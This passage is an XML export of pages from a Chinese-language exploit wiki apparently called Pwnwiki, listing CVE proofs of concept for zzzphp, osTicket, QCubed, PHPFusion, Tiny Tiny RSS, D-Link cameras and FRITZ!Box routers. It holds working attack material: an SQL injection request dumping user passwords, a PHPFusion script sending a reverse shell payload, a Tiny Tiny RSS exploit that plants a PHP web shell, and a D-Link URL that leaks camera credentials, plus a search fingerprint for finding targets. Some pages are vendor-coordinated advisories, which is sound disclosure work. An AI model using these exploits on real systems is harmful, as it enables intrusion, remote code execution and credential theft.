      <comment>Created page with "==POC== &lt;pre&gt; POST /zzzphp/form/index.php?module=getjson  table=gbook&amp;where[]=1=1 union select password from zzz_user&amp;col=1  &lt;/pre&gt;"</comment>
      <origin>420</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="131" sha1="rv4350n46s1galucv8aqy3m8bgc78lv" xml:space="preserve">==POC==
&lt;pre&gt;
POST /zzzphp/form/index.php?module=getjson

table=gbook&amp;where[]=1=1 union select password from zzz_user&amp;col=1

&lt;/pre&gt;</text>
      <sha1>rv4350n46s1galucv8aqy3m8bgc78lv</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-24881 osTicket 1.14.2 服務器端請求偽造漏洞</title>
    <ns>0</ns>
    <id>3230</id>
    <revision>
      <id>3768</id>
      <timestamp>2021-05-31T04:06:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; # Exploit Title: osTicket 1.14.2 - SSRF # Date: 18-01-2021 # Exploit Author: Talat Mehmood # Vendor Homepage: https://osticket.com/ # Software Link: https://osti..."</comment>
      <origin>3768</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="979" sha1="l1dhqf0499zf6kxw0oi2rzu4bdkyu1a" xml:space="preserve">==POC==
&lt;pre&gt;
# Exploit Title: osTicket 1.14.2 - SSRF
# Date: 18-01-2021
# Exploit Author: Talat Mehmood
# Vendor Homepage: https://osticket.com/
# Software Link: https://osticket.com/download/
# Version: &lt;1.14.3 
# Tested on: Linux
# CVE : CVE-2020-24881

osTicket before 1.14.3 suffers from Server Side Request Forgery [SSRF]. HTML page is rendered on backend server on calling "Print" ticket functionality.

Below are the steps to reproduce this vulnerability:

1. Create a new ticket
2. Select "HTML Format" format.
3. Add an image tag with your payload in src attribute i.e. "&lt;img src=https://mymaliciouswebsite.com"&gt;
4. After submitting this comment, print this ticket.
5. You'll receive a hit on your malicious website from the internal server on which osTicket is deployed.

For more details, read my following blog:

https://blackbatsec.medium.com/cve-2020-24881-server-side-request-forgery-in-osticket-eea175e147f0
https://nvd.nist.gov/vuln/detail/CVE-2020-24881
&lt;/pre&gt;</text>
      <sha1>l1dhqf0499zf6kxw0oi2rzu4bdkyu1a</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-24912 QCubed 3.11 XSS漏洞</title>
    <ns>0</ns>
    <id>3120</id>
    <revision>
      <id>3623</id>
      <timestamp>2021-05-30T02:37:02Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; QCube Cross-Site-Scripting ====================== | Identifier: | AIT-SA-20210215-03 | | Target: | QCubed Framework | | Vendor: | QCubed | | Version: | all versi..."</comment>
      <origin>3623</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2092" sha1="k6jb0jh0cp8f882nn752nwexmlm7omo" xml:space="preserve">==EXP==
&lt;pre&gt;
QCube Cross-Site-Scripting
======================
| Identifier: | AIT-SA-20210215-03 |
| Target: | QCubed Framework |
| Vendor: | QCubed |
| Version: | all versions including 3.1.1 |
| CVE: | CVE-2020-24912 |
| Accessibility: | Remote |
| Severity: | High |
| Author: | Wolfgang Hotwagner (AIT Austrian Institute of Technology) |

SUMMARY
=======
QCubed is a PHP Model-View-Controller Rappid Application Development framework. (https://github.com/qcubed/qcubed)

VULNERABILITY DESCRIPTION
=========================
A reflected cross-site scripting (XSS) vulnerability in qcubed (all versions including 3.1.1) in profile.php via the stQuery-parameter allows unauthenticated attackers to steal sessions of authenticated users.

PROOF OF CONCEPT
=================
The XSS occurs because the SQL-output in profile.php is not sanitized properly. Since we are able to tamper the output using a SQL-injection(CVE-2020-24913), we can easily output a common XSS string.

We use the following payload(unencoded):

```
a:1:{i:0;a:3:{s:12:"objBacktrace";a:1:{s:4:"args";a:1:{i:0;s:3:"PWN";}}s:8:"strQuery";s:112:"select version(); select convert_from(decode($$PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4K$$,$$base64$$),$$utf-8$$)";s:11:"dblTimeInfo";s:1:"1";}}
```

PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4K is unencoded:

```
"&lt;script&gt;alert(‘xss’)&lt;/script&gt;"
```

VULNERABLE VERSIONS
===================
All versions including 3.1.1 are affected.


TESTED VERSIONS
===============
QCubed 3.1.1

IMPACT
======
An unauthenticated attacker could  steal sessions of authenticated users.

MITIGATION
==========

A patch was delivered by QCubed that allows to disable the profile-functionality( https://github.com/qcubed/qcubed/pull/1320/files ).

VENDOR CONTACT TIMELINE
=======================   

| 2020-04-19 | Contacting the vendor |
| 2020-04-19 | Vendor replied |
| 2020-05-01 | Vendor released a patch at Github |
| 2021-02-15 | Public disclosure |

ADVISORY URL
============
[https://www.ait.ac.at/ait-sa-20210215-03-xss-qcubed](https://www.ait.ac.at/ait-sa-20210215-03-xss-qcubed)
&lt;/pre&gt;</text>
      <sha1>k6jb0jh0cp8f882nn752nwexmlm7omo</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-24913 QCubed 3.11 SQL注入漏洞</title>
    <ns>0</ns>
    <id>3121</id>
    <revision>
      <id>3624</id>
      <timestamp>2021-05-30T02:37:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; QCubed SQL Injection ==================  | Identifier: | AIT-SA-20210215-02 | | Target: | QCubed Framework | | Vendor: | QCubed | | Version: | all versions including 3.1..."</comment>
      <origin>3624</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2155" sha1="d92bcy7jvetk66fn6s5omj4u5gqd0ah" xml:space="preserve">&lt;pre&gt;
QCubed SQL Injection
==================

| Identifier: | AIT-SA-20210215-02 |
| Target: | QCubed Framework |
| Vendor: | QCubed |
| Version: | all versions including 3.1.1 |
| CVE: | CVE-2020-24913 |
| Accessibility: | Remote |
| Severity: | Critical |
| Author: | Wolfgang Hotwagner (AIT Austrian Institute of Technology) |

SUMMARY
=======
QCubed is a PHP Model-View-Controller Rappid Application Development framework. (https://github.com/qcubed/qcubed)

VULNERABILITY DESCRIPTION
=========================
A SQL injection vulnerability in qcubed (all versions including 3.1.1)  in profile.php via the strQuery parameter allows an unauthenticated  attacker to access the database by injecting SQL code via a crafted POST  request.  The strQuery parameter of the serialized array in profile.php  could lead to a sql-injection. This parameter is used by the  PrintExplainStatement which simply concats "EXPLAIN ." with this  parameter:

public function ExplainStatement($sql) {
     return $this-&gt;Query("EXPLAIN " . $sql);
}


This query will be executed unfiltered.

We were able to write proof-of concept exploit for mysql and postgres.  Unfortunately with mysql we were not able to use a  stacked-queries-payload and we had to exploit this vulnerability with a  timebased approach.


VULNERABLE VERSIONS
===================
All versions including 3.1.1 are affected.


TESTED VERSIONS
===============
QCubed 3.1.1

IMPACT
======
An unauthenticated attacker could  access the database remotely. In  worst case scenarios an attacker might be able to execute code on the  remote machine

MITIGATION
==========

A patch was delivered by QCubed that allows to disable the profile-functionality( https://github.com/qcubed/qcubed/pull/1320/files ).

VENDOR CONTACT TIMELINE
=======================   

| 2020-04-19 | Contacting the vendor |
| 2020-04-19 | Vendor replied |
| 2020-05-01 | Vendor released a patch at Github |
| 2021-02-15 | Public disclosure |

ADVISORY URL
============

[https://www.ait.ac.at/ait-sa-20210215-02-unauthenticated-sql-injection-qcubed](https://www.ait.ac.at/ait-sa-20210215-02-unauthenticated-sql-injection-qcubed)
&lt;/pre&gt;</text>
      <sha1>d92bcy7jvetk66fn6s5omj4u5gqd0ah</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-24949 PHPFusion 9.03.50 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>3098</id>
    <revision>
      <id>3598</id>
      <timestamp>2021-05-28T09:44:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: PHPFusion 9.03.50 - Remote Code Execution # Date: 20/05/2021 # Exploit Author: g0ldm45k # Vendor Homepage: https://www.php-fusion.co.uk/home.php..."</comment>
      <origin>3598</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1912" sha1="p7f2cfb2mc8pgosct5g8kra0gpl9y82" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: PHPFusion 9.03.50 - Remote Code Execution
# Date: 20/05/2021
# Exploit Author: g0ldm45k
# Vendor Homepage: https://www.php-fusion.co.uk/home.php
# Software Link: https://www.php-fusion.co.uk/infusions/downloads/downloads.php?cat_id=30&amp;download_id=606
# Version: 9.03.50
# Tested on: Docker + Debian GNU/Linux 8 (jessie)
# CVE : CVE-2020-24949
# Found by: ThienNV

import requests
import base64
import argparse


PAYLOAD = "php -r '$sock=fsockopen(\"127.0.0.1\",4444);exec(\"/bin/sh -i &lt;&amp;4 &gt;&amp;4 2&gt;&amp;4\");'  " # !!spaces are important in order to avoid ==!!
REQUEST_PAYLOAD = "/infusions/downloads/downloads.php?cat_id=$\{{system(base64_decode({})).exit\}}"


parser = argparse.ArgumentParser(description='Send a payload to a Fusion 9.03.50 server with "Allow PHP Execution" enabled.')
parser.add_argument('target', type=str, help='Turn the Allow PHP Execution verification step on or off.')
parser.add_argument("-v", "--no-verify", action="store_false")

args = parser.parse_args()

if args.target.startswith("http://") or args.target.startswith("https://"):
    target = args.target
else:
    print("[!] Target should start with either http:// or https://")
    exit()

# verify payload
PAYLOAD_B64 = base64.b64encode(PAYLOAD.encode('ascii')).decode("ascii")
if '+' in PAYLOAD_B64 or '=' in PAYLOAD_B64:
    print("[!] Invalid payload, make sure it does not contain a + or a =!")
    exit()

# verify vulnerable host
if args.no_verify:
    page_data = requests.get(target + "/infusions/downloads/downloads.php?cat_id=${system(ls)}")
    if "infusion_db.php" not in page_data.text:
        print("[!] Can't seem to find infusion_db.php. QUITTING!")
        print("[!] If this validation is wrong just use the --no-verify flag.")
        exit()


# send request
requests.get(target + REQUEST_PAYLOAD.format(PAYLOAD_B64))

print("[*] Requests send, did you get what you wanted?")
&lt;/pre&gt;</text>
      <sha1>p7f2cfb2mc8pgosct5g8kra0gpl9y82</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-25078 D-Link DCS系列監控 賬號密碼信息洩露漏洞</title>
    <ns>0</ns>
    <id>559</id>
    <revision>
      <id>767</id>
      <timestamp>2021-03-30T07:46:08Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt;  &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; DCS-2530L DCS-2670L DCS-4603 DCS-4622 &lt;/pre&gt;   ==FOFA== &lt;pre&gt; app="D_Link-DCS-2530L" &lt;/pre&gt;  &lt;translate&gt; ==密..."</comment>
      <origin>767</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="351" sha1="qcy9jf8ezmz90sc5ymqak3jgw4ahya1" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
DCS-2530L
DCS-2670L
DCS-4603
DCS-4622
&lt;/pre&gt;


==FOFA==
&lt;pre&gt;
app="D_Link-DCS-2530L"
&lt;/pre&gt;

&lt;translate&gt;
==密碼泄漏漏洞==
&lt;/translate&gt;
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/config/getuser?index=0
&lt;/pre&gt;


&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://mp.weixin.qq.com/s/b7jyA5sylkDNauQbwZKvBg</text>
      <sha1>qcy9jf8ezmz90sc5ymqak3jgw4ahya1</sha1>
    </revision>
    <revision>
      <id>768</id>
      <parentid>767</parentid>
      <timestamp>2021-03-30T07:46:19Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>768</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="384" sha1="5odu236fu4a9mzbjfm7tfpcjb5m20cc" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
DCS-2530L
DCS-2670L
DCS-4603
DCS-4622
&lt;/pre&gt;


==FOFA==
&lt;pre&gt;
app="D_Link-DCS-2530L"
&lt;/pre&gt;

&lt;translate&gt;
==密碼泄漏漏洞== &lt;!--T:2--&gt;
&lt;/translate&gt;
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/config/getuser?index=0
&lt;/pre&gt;


&lt;translate&gt;
==參考== &lt;!--T:3--&gt;
&lt;/translate&gt;
https://mp.weixin.qq.com/s/b7jyA5sylkDNauQbwZKvBg</text>
      <sha1>5odu236fu4a9mzbjfm7tfpcjb5m20cc</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-25787 Tiny Tiny RSS 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1216</id>
    <revision>
      <id>1521</id>
      <timestamp>2021-04-11T01:56:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Tiny Tiny RSS - Remote Code Execution # Date: 21/09/2020 # Exploit Author: Daniel Neagaru &amp; Benjamin Nadarević # Blog post: https://www.digeex...."</comment>
      <origin>1521</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2758" sha1="7ajtiqnu8hw7jvq1k3sx0gc9e1423bp" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Tiny Tiny RSS - Remote Code Execution
# Date: 21/09/2020
# Exploit Author: Daniel Neagaru &amp; Benjamin Nadarević
# Blog post: https://www.digeex.de/blog/tinytinyrss/
# Software Link: https://git.tt-rss.org/fox/tt-rss
# Version: all before 2020-09-16
# Commit with the fixes: https://git.tt-rss.org/fox/tt-rss/commit/c3d14e1fa54c7dade7b1b7955575e2991396d7ef
# Tested on: default docker installation method
# CVE : CVE-2020-25787

#!/usr/bin/env python3

from sys import argv
import urllib.parse as ul
import base64


def CustomFcgi( filename, output, backdoor):
    length=len(output)+len(backdoor)+64
    char=chr(length)

    data = "\x0f\x10SERVER_SOFTWAREgo / fcgiclient \x0b\tREMOTE_ADDR127.0.0.1\x0f\x08SERVER_PROTOCOLHTTP/1.1\x0e" + chr(len(str(length)))
    data += "CONTENT_LENGTH" + str(length) +  "\x0e\x04REQUEST_METHODPOST\tKPHP_VALUEallow_url_include = On\n"
    data += "disable_functions = \nauto_prepend_file = php://input\x0f" + chr(len(filename)) +"SCRIPT_FILENAME" + filename + "\r\x01DOCUMENT_ROOT/"

    temp1 = chr(len(data) // 256)
    temp2 = chr(len(data) % 256)
    temp3 = chr(len(data) % 8)

    end = str("\x00"*(len(data)%8)) + "\x01\x04\x00\x01\x00\x00\x00\x00\x01\x05\x00\x01\x00" + char + "\x04\x00"
    end += "&lt;?php file_put_contents('" + output + "',base64_decode("+ "'"+str(backdoor.decode('ascii'))+"')"+");die('executed');?&gt;\x00\x00\x00\x00"
    start = "\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x04\x00\x01" + temp1 + temp2 + temp3 + "\x00"

    payload = start + data + end
    def get_payload(payload):
        finalpayload = ul.quote_plus(payload, encoding="latin-1").replace("+","%20").replace("%2F","/")
        return finalpayload

    return "gopher://localhost:9000/_"+get_payload(get_payload(payload))



TTRSS_PATH = "/var/www/html/tt-rss/"
BACKDOOR_CODE = """
&lt;?php
echo "success\n";
echo system($_GET['cmd']);
?&gt;
"""


feed_file = open("malicious_RCE_feed.xml",'w')
filename = TTRSS_PATH + "config.php"
output = TTRSS_PATH + "backdoor.php"

backdoor_code = base64.b64encode(BACKDOOR_CODE.encode("ascii"))
rce = "public.php?op=pluginhandler&amp;plugin=af_proxy_http&amp;pmethod=imgproxy&amp;url=" + CustomFcgi(filename, output, backdoor_code) + "&amp;text"

feed ="""&lt;?xml version="1.0" encoding="UTF-8" ?&gt;
&lt;rss version="2.0"&gt;

&lt;channel&gt;
  &lt;title&gt;Exploit demo - rce&lt;/title&gt;
  &lt;link&gt;&lt;/link&gt;
  &lt;description&gt;You are getting infected :(&lt;/description&gt;
  &lt;item&gt;
    &lt;title&gt; Check if there is backdoor.php&lt;/title&gt;
    &lt;link&gt;&lt;![CDATA[backdoor.php?cmd=id&amp;bypass_filter=://]]&gt;&lt;/link&gt;
    &lt;description&gt;
    &lt;![CDATA[
        Dummy text

        &lt;img src="{}"&gt;

    ]]&gt;
&lt;/description&gt;
  &lt;/item&gt;
&lt;/channel&gt;
&lt;/rss&gt;
""".format(rce)

feed_file.write(feed)
feed_file.close()

&lt;/pre&gt;</text>
      <sha1>7ajtiqnu8hw7jvq1k3sx0gc9e1423bp</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-26887 DNS Rebinding Protection繞過漏洞</title>
    <ns>0</ns>
    <id>3595</id>
    <revision>
      <id>4178</id>
      <timestamp>2021-06-06T14:16:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==已修復版本== &lt;/translate&gt; &gt;= 7.21  ==POC== &lt;pre&gt; Supposing the following resource records (RR) are configured for different subdomains of exam..."</comment>
      <origin>4178</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2397" sha1="e3sbryxnh2qnc8vhrcphru479mubw45" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==已修復版本==
&lt;/translate&gt;
&gt;= 7.21

==POC==
&lt;pre&gt;
Supposing the following resource records (RR) are configured for different
subdomains of example.com:

------------------------------------------------------------------------
private.example.com        1  IN  A     192.168.178.20
local.example.com          1  IN  A     127.0.0.1
privateipv6.example.com.   1  IN  AAAA  ::ffff:192.168.178.20
------------------------------------------------------------------------

A DNS request to the FRITZ!Box router for the subdomain
private.example.com returns an empty answer, as expected:

------------------------------------------------------------------------
$ dig private.example.com @192.168.178.1
; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+deb10u1-Debian &lt;&lt;&gt;&gt; private.example.com @192.168.178.1
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 58984
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;private.example.com.	IN	A
------------------------------------------------------------------------

DNS requests for the subdomains privateipv6.example.com and
local.example.com return the configured resource records successfully,
effectively bypassing the DNS rebinding protection:

------------------------------------------------------------------------
$ dig privateipv6.example.com @192.168.178.1 AAAA
; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+deb10u1-Debian &lt;&lt;&gt;&gt; @192.168.178.1 privateipv6.example.com AAAA
; (1 server found)
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 6510
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;privateipv6.example.com.	IN	AAAA

;; ANSWER SECTION:
privateipv6.example.com. 1	IN	AAAA	::ffff:192.168.178.20


$ dig local.example.com @192.168.178.1
; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+deb10u1-Debian &lt;&lt;&gt;&gt; local.example.com @192.168.178.1
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 28549
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;local.example.com.	IN	A

;; ANSWER SECTION:
local.example.com. 1	IN	A	127.0.0.1
------------------------------------------------------------------------
&lt;/pre&gt;</text>
      <sha1>e3sbryxnh2qnc8vhrcphru479mubw45</sha1>
    </revision>
    <revision>
      <id>4179</id>
      <parentid>4178</parentid>
      <timestamp>2021-06-06T14:16:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4179</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2408" sha1="pqsn9bylraewk011f1i385o3derhdlg" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==已修復版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&gt;= 7.21

==POC==
&lt;pre&gt;
Supposing the following resource records (RR) are configured for different
subdomains of example.com:

------------------------------------------------------------------------
private.example.com        1  IN  A     192.168.178.20
local.example.com          1  IN  A     127.0.0.1
privateipv6.example.com.   1  IN  AAAA  ::ffff:192.168.178.20
------------------------------------------------------------------------

A DNS request to the FRITZ!Box router for the subdomain
private.example.com returns an empty answer, as expected:

------------------------------------------------------------------------
$ dig private.example.com @192.168.178.1
; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+deb10u1-Debian &lt;&lt;&gt;&gt; private.example.com @192.168.178.1
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 58984
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;private.example.com.	IN	A
------------------------------------------------------------------------

DNS requests for the subdomains privateipv6.example.com and
local.example.com return the configured resource records successfully,
effectively bypassing the DNS rebinding protection:

------------------------------------------------------------------------
$ dig privateipv6.example.com @192.168.178.1 AAAA
; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+deb10u1-Debian &lt;&lt;&gt;&gt; @192.168.178.1 privateipv6.example.com AAAA
; (1 server found)
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 6510
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;privateipv6.example.com.	IN	AAAA

;; ANSWER SECTION:
privateipv6.example.com. 1	IN	AAAA	::ffff:192.168.178.20


$ dig local.example.com @192.168.178.1
; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+deb10u1-Debian &lt;&lt;&gt;&gt; local.example.com @192.168.178.1
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 28549
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;local.example.com.	IN	A

;; ANSWER SECTION:
local.example.com. 1	IN	A	127.0.0.1
------------------------------------------------------------------------
&lt;/pre&gt;</text>
      <sha1>pqsn9bylraewk011f1i385o3derhdlg</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-26887 DNS Rebinding Protection繞過漏洞/es</title>
    <ns>0</ns>
    <id>4477</id>
    <revision>
      <id>5153</id>
      <timestamp>2021-06-16T02:09:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2020-26887 Vulnerabilidad de omisión de la Proteccion de Rebinding DNS"</comment>
      <origin>5153</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2372" sha1="odadsmwt4kq0dntjbu009i4c4f7twaf" xml:space="preserve">&lt;languages /&gt;
== Versión fija ==
&gt;= 7.21

==POC==
&lt;pre&gt;
Supposing the following resource records (RR) are configured for different
subdomains of example.com:

------------------------------------------------------------------------
private.example.com        1  IN  A     192.168.178.20
local.example.com          1  IN  A     127.0.0.1
privateipv6.example.com.   1  IN  AAAA  ::ffff:192.168.178.20
------------------------------------------------------------------------

A DNS request to the FRITZ!Box router for the subdomain
private.example.com returns an empty answer, as expected:

------------------------------------------------------------------------
$ dig private.example.com @192.168.178.1
; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+deb10u1-Debian &lt;&lt;&gt;&gt; private.example.com @192.168.178.1
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 58984
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;private.example.com.	IN	A
------------------------------------------------------------------------

DNS requests for the subdomains privateipv6.example.com and
local.example.com return the configured resource records successfully,
effectively bypassing the DNS rebinding protection:

------------------------------------------------------------------------
$ dig privateipv6.example.com @192.168.178.1 AAAA
; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+deb10u1-Debian &lt;&lt;&gt;&gt; @192.168.178.1 privateipv6.example.com AAAA
; (1 server found)
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 6510
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;privateipv6.example.com.	IN	AAAA

;; ANSWER SECTION:
privateipv6.example.com. 1	IN	AAAA	::ffff:192.168.178.20


$ dig local.example.com @192.168.178.1
; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+deb10u1-Debian &lt;&lt;&gt;&gt; local.example.com @192.168.178.1
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 28549
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;local.example.com.	IN	A

;; ANSWER SECTION:
local.example.com. 1	IN	A	127.0.0.1
------------------------------------------------------------------------
&lt;/pre&gt;</text>
      <sha1>odadsmwt4kq0dntjbu009i4c4f7twaf</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-26887 DNS Rebinding Protection繞過漏洞/zh-cn</title>
    <ns>0</ns>
    <id>3600</id>
    <revision>
      <id>4184</id>
      <timestamp>2021-06-06T14:18:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2020-26887 DNS Rebinding Protection绕过漏洞"</comment>
      <origin>4184</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2372" sha1="9mhvn8xtzv4az57gj4spm1j6qn0vt9k" xml:space="preserve">&lt;languages /&gt;
==已修复版本==
&gt;= 7.21

==POC==
&lt;pre&gt;
Supposing the following resource records (RR) are configured for different
subdomains of example.com:

------------------------------------------------------------------------
private.example.com        1  IN  A     192.168.178.20
local.example.com          1  IN  A     127.0.0.1
privateipv6.example.com.   1  IN  AAAA  ::ffff:192.168.178.20
------------------------------------------------------------------------

A DNS request to the FRITZ!Box router for the subdomain
private.example.com returns an empty answer, as expected:

------------------------------------------------------------------------
$ dig private.example.com @192.168.178.1
; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+deb10u1-Debian &lt;&lt;&gt;&gt; private.example.com @192.168.178.1
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 58984
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;private.example.com.	IN	A
------------------------------------------------------------------------

DNS requests for the subdomains privateipv6.example.com and
local.example.com return the configured resource records successfully,
effectively bypassing the DNS rebinding protection:

------------------------------------------------------------------------
$ dig privateipv6.example.com @192.168.178.1 AAAA
; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+deb10u1-Debian &lt;&lt;&gt;&gt; @192.168.178.1 privateipv6.example.com AAAA
; (1 server found)
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 6510
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;privateipv6.example.com.	IN	AAAA

;; ANSWER SECTION:
privateipv6.example.com. 1	IN	AAAA	::ffff:192.168.178.20


$ dig local.example.com @192.168.178.1
; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+deb10u1-Debian &lt;&lt;&gt;&gt; local.example.com @192.168.178.1
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 28549
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;local.example.com.	IN	A

;; ANSWER SECTION:
local.example.com. 1	IN	A	127.0.0.1
------------------------------------------------------------------------
&lt;/pre&gt;</text>
      <sha1>9mhvn8xtzv4az57gj4spm1j6qn0vt9k</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-27131 Cisco Security Manager 反序列化RCE漏洞</title>
    <ns>0</ns>
    <id>1520</id>
    <revision>
      <id>1902</id>
